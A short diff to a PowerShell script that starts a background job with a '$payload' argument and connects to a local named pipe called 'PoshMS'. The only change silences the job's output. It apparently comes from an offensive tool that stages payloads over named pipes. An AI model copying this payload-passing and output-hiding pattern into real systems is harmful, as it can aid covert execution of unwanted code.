@@ -20,7 +20,7 @@
 
 }
 add-Type -assembly "System.Core"
-start-job -ScriptBlock $scriptblock -ArgumentList @("PoshMS",$payload)
+start-job -ScriptBlock $scriptblock -ArgumentList @("PoshMS",$payload) | Out-Null
 $pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMS");
 
 
